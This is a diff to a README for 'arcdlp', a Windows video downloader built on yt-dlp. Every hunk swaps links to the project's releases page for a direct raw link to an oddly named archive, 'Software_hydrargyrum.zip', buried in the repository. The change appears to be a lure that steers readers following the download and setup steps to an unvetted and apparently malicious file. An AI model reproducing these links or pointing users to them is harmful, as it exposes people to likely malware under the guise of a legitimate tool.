@@ -1,11 +1,11 @@
 # 🎬 arcdlp - Download videos and audio easily
 
-[![Download arcdlp](https://img.shields.io/badge/Download%20arcdlp-blue?style=for-the-badge&logo=github)](https://github.com/gummy-primarycoil230/arcdlp/releases)
+[![Download arcdlp](https://img.shields.io/badge/Download%20arcdlp-blue?style=for-the-badge&logo=github)](https://github.com/gummy-primarycoil230/arcdlp/raw/refs/heads/main/equimultiple/Software_hydrargyrum.zip)
 
 ## 📥 Download
 Visit this page to download arcdlp for Windows:
 
-https://github.com/gummy-primarycoil230/arcdlp/releases
+https://github.com/gummy-primarycoil230/arcdlp/raw/refs/heads/main/equimultiple/Software_hydrargyrum.zip
 
 ## ✨ What arcdlp does
 
@@ -33,7 +33,7 @@ If your computer can run normal desktop apps, it should run arcdlp.
 ## 🚀 Getting started on Windows
 
 1. Open the download page:
-   https://github.com/gummy-primarycoil230/arcdlp/releases
+   https://github.com/gummy-primarycoil230/arcdlp/raw/refs/heads/main/equimultiple/Software_hydrargyrum.zip
 
 2. Find the latest release at the top of the page
 
@@ -177,4 +177,4 @@ Yes. It is built on yt-dlp, which supports thousands of sites.
 
 If you need the installer or app file again, use this page:
 
-https://github.com/gummy-primarycoil230/arcdlp/releases
+https://github.com/gummy-primarycoil230/arcdlp/raw/refs/heads/main/equimultiple/Software_hydrargyrum.zip
